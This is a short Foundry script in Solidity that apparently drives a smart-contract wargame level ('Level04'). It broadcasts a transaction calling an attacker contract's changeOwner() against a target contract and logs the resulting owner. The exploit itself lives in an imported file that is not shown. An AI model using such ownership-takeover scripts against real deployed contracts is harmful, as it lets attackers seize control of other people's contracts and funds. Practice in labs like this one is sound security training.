// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level04-Attacker.sol";
import "../src/Level04.sol";

contract AttackerScript is Script {
    AttackerLevel04 attackerLevel04 = AttackerLevel04(0xBea5E2c133741ef00Bb7fB41405B8d4a73aF3630);
    Level04 level04 = Level04(0xf73973A0F50B7294945B532c6DD98567dEaa6D33);

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      attackerLevel04.changeOwner();
      console.log(level04.owner());
      vm.stopBroadcast();
    }
}
